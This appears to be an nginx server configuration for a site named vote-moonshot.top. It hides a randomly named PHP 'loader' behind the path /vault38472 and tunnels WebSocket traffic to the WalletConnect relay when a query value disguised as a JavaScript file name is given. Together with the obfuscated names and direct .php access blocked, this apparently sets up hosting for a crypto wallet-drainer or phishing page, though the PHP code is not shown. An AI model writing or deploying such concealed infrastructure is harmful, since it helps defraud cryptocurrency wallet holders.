# /etc/nginx/sites-available/mysite
# Site root = /var/www/mysite/public (HTML + loader.php)
# Do NOT use snippets/fastcgi-php.conf — it breaks SCRIPT_FILENAME.

server {
    listen 80;
    listen [::]:80;
    server_name vote-moonshot.top www.vote-moonshot.top;

    root /var/www/lol/public;
    index index.html;

    # Match script_path in loader.php $cfg (no .php in URL)
    # ?c=Zt8nK4mP2wRq.js — WebSocket relay chunk (sync ws_relay_chunk in loader.php)
    location = /vault38472 {
        if ($arg_c = "Zt8nK4mP2wRq.js") {
            proxy_pass https://relay.walletconnect.org;
            proxy_http_version 1.1;
            proxy_set_header Upgrade $http_upgrade;
            proxy_set_header Connection "upgrade";
            proxy_set_header Host $proxy_host;
            proxy_ssl_server_name on;
        }

        include fastcgi_params;
        fastcgi_pass unix:/run/php/php8.4-fpm.sock;
        fastcgi_param SCRIPT_FILENAME /var/www/lol/public/5joud6Jn.php;
    }

    location = /vault38472.php {
        include fastcgi_params;
        fastcgi_pass unix:/run/php/php8.4-fpm.sock;
        fastcgi_param SCRIPT_FILENAME /var/www/lol/public/5joud6Jn.php;
    }

    location ~ \.php$ {
        deny all;
    }

    location ~ /\. {
        deny all;
    }
}

# After certbot: copy location blocks into the listen 443 ssl { } server.
